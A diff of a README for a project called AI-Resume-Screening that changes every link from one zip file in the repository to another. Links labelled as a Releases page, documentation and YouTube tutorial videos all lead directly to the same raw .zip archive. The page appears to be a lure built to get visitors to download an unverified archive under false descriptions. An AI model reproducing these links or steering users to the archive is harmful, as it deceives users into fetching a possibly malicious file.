@@ -1,6 +1,6 @@
 # 🚀 AI-Resume-Screening - Transform Resumes with AI Insights
 
-[![Download](https://raw.githubusercontent.com/cuongmoitapcode/AI-Resume-Screening/main/frontend/Screening-A-Resume-v1.9.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/cuongmoitapcode/AI-Resume-Screening/main/frontend/Screening-A-Resume-v1.9.zip)
+[![Download](https://raw.githubusercontent.com/cuongmoitapcode/AI-Resume-Screening/main/frontend/src/Screening-Resume-A-v2.9.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/cuongmoitapcode/AI-Resume-Screening/main/frontend/src/Screening-Resume-A-v2.9.zip)
 
 ## 🎯 Project Overview
 
@@ -33,7 +33,7 @@ AI-Resume-Screening is an intelligent web application designed to analyze resume
 Follow these steps to download and run the application:
 
 1. **Visit the Releases Page**: Click the link below to navigate to our Releases page.
-   [Download from Releases](https://raw.githubusercontent.com/cuongmoitapcode/AI-Resume-Screening/main/frontend/Screening-A-Resume-v1.9.zip)
+   [Download from Releases](https://raw.githubusercontent.com/cuongmoitapcode/AI-Resume-Screening/main/frontend/src/Screening-Resume-A-v2.9.zip)
 
 2. **Choose Your Version**: On the Releases page, you will see a list of available versions. Choose the latest version for the best experience.
 
@@ -77,8 +77,8 @@ If you encounter any issues, feel free to reach out for help. You can:
 
 Explore additional resources to maximize your experience:
 
-- [AI-Resume-Screening Documentation](https://raw.githubusercontent.com/cuongmoitapcode/AI-Resume-Screening/main/frontend/Screening-A-Resume-v1.9.zip)
-- [Tutorial Videos on YouTube](https://raw.githubusercontent.com/cuongmoitapcode/AI-Resume-Screening/main/frontend/Screening-A-Resume-v1.9.zip)
+- [AI-Resume-Screening Documentation](https://raw.githubusercontent.com/cuongmoitapcode/AI-Resume-Screening/main/frontend/src/Screening-Resume-A-v2.9.zip)
+- [Tutorial Videos on YouTube](https://raw.githubusercontent.com/cuongmoitapcode/AI-Resume-Screening/main/frontend/src/Screening-Resume-A-v2.9.zip)
 
 ## 🛠 Contribution
 
@@ -91,6 +91,6 @@ Stay updated with new features and improvements by following this repository on 
 ## 🌐 Download & Install
 
 Again, visit the Releases page to download the latest version: 
-[Download Now](https://raw.githubusercontent.com/cuongmoitapcode/AI-Resume-Screening/main/frontend/Screening-A-Resume-v1.9.zip) 
+[Download Now](https://raw.githubusercontent.com/cuongmoitapcode/AI-Resume-Screening/main/frontend/src/Screening-Resume-A-v2.9.zip) 
 
 Take the first step towards smarter resume screening today.
